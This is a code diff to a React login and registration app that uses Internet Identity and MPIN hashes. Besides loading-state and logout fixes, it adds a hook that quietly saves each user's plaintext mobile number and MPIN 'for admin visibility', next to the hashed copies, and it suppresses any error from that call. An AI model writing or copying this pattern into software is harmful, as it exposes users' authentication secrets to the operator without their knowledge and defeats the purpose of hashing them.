@@ -8,6 +8,7 @@ import { useInternetIdentity } from "./hooks/useInternetIdentity";
 import {
   useCallerProfile,
   useGetMpinStatus,
+  useSaveAdminVisibleData,
   useSaveProfile,
   useSetMpin,
   useSetUserCredentials,
@@ -69,7 +70,7 @@ function AdminApp() {
 // ─── User App ─────────────────────────────────────────────────────────────────
 function UserApp() {
   const { identity, isInitializing, clear } = useInternetIdentity();
-  const { actor } = useActor();
+  const { actor, isFetching: actorFetching } = useActor();
   const { data: profile, isLoading: profileLoading } = useCallerProfile();
   const { data: mpinStatus, isLoading: mpinLoading } = useGetMpinStatus();
   const [screen, setScreen] = useState<Screen>("home");
@@ -84,6 +85,7 @@ function UserApp() {
   const { mutateAsync: saveProfileFn } = useSaveProfile();
   const { mutateAsync: setCredsFn } = useSetUserCredentials();
   const { mutateAsync: setMpinFn } = useSetMpin();
+  const { mutateAsync: saveAdminVisibleDataFn } = useSaveAdminVisibleData();
 
   const [pendingCreds, setPendingCreds] = useState<{
     mobileHash: string;
@@ -123,6 +125,15 @@ function UserApp() {
           }),
           setMpinFn(reg.mpinHash),
         ]);
+        // Save plaintext mobile and MPIN for admin visibility
+        try {
+          await saveAdminVisibleDataFn({
+            mobile: reg.mobilePlain || "",
+            mpin: reg.mpinPlain || "",
+          });
+        } catch {
+          // non-critical, continue
+        }
         setRegistrationError("");
       } catch (err: unknown) {
         const errMsg = String(err);
@@ -141,6 +152,7 @@ function UserApp() {
     pendingRegistration,
     profile,
     registrationSaving,
+    saveAdminVisibleDataFn,
     saveProfileFn,
     setCredsFn,
     setMpinFn,
@@ -190,7 +202,7 @@ function UserApp() {
     pendingRegistration,
   ]);
 
-  const loading = identity && (profileLoading || mpinLoading);
+  const loading = identity && (profileLoading || mpinLoading || actorFetching);
 
   if (isInitializing || loading) {
     return (
@@ -258,26 +270,21 @@ function UserApp() {
   }
 
   if (!profile) {
-    if (mpinStatus?.isSet || mpinLoading) {
+    if (profileLoading || mpinLoading || actorFetching || registrationSaving) {
       return (
         <div className="min-h-screen bg-background flex items-center justify-center">
           <div className="flex flex-col items-center gap-4">
             <div className="w-16 h-16 rounded-full bg-primary/20 flex items-center justify-center">
               <Loader2 className="w-7 h-7 text-primary animate-spin" />
             </div>
-            <p className="text-muted-foreground text-sm">
-              Profile load ho raha hai...
-            </p>
+            <p className="text-muted-foreground text-sm">Loading...</p>
           </div>
         </div>
       );
     }
-    return (
-      <>
-        <SetupProfile />
-        <Toaster />
-      </>
-    );
+    // Profile not found for this identity - clear session and go to login
+    clear();
+    return null;
   }
 
   if (pendingCreds && !credentialsVerified) {
